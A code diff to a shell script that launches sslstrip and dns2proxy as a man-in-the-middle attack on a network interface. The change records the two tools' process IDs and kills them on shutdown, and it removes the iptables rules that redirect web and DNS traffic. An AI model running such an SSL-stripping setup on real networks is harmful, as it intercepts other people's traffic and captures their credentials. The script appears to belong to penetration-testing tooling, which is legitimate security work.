@@ -12,14 +12,21 @@ default_interface="at0"
 
 # Cleanup function to ensure sslstrip stops and iptable rules stop
 f_clean_up(){
-  printf "\n[!] Killing other instances of sslstrip and flushing iptables\n\n"
-  sslstrippid=$(pgrep -x sslstrip)
-  dns2proxypid=$(pgrep -x dns2proxy.py)
-  kill $sslstrippid $dns2proxypid > /dev/null 2>&1
+  printf "\n[!] Shutting down sslstrip..."
+  if [ -n "${sslstrippid}" ]; then
+    printf "killing sslstrip[${sslstrippid}]\n"
+    kill ${sslstrippid} > /dev/null 2>&1
+  fi
+  if [ -n "${dns2proxypid}" ]; then
+    printf "killing dns2proxy[${dns2proxypid}]\n"
+    kill ${dns2proxypid} > /dev/null 2>&1
+  fi
 
+  printf "flushing iptables\n"
   # Remove SSL Strip iptables rule ONLY
   iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
   iptables -t nat -D PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
+  printf "Shutdown complete\n\n"
   cd "${LOGDIR}" &> /dev/null
 }
 
@@ -53,11 +60,13 @@ f_run(){
   if [ -r "${dns2proxy_path}/dns2proxy.py" ]; then
     cd "${dns2proxy_path}"
     python "${dns2proxy_path}/dns2proxy.py" "${int_syntax}"${interface} > /dev/null 2>&1 &
+    dns2proxypid=$!
     printf "dns2proxy by LeonardoNVE is running...\n"
   else
     printf "dns2proxy is currently unavailable\n"
   fi
   /usr/bin/sslstrip -pfk -w "${logfile}" -l 8888 ${interface} > /dev/null 2>&1 &
+  sslstrippid=$!
   printf "sslstrip 0.9 by Moxie Marlinespike running...\n"
   printf "tailing log file, ^c to quit and shut down attack.\n"
 
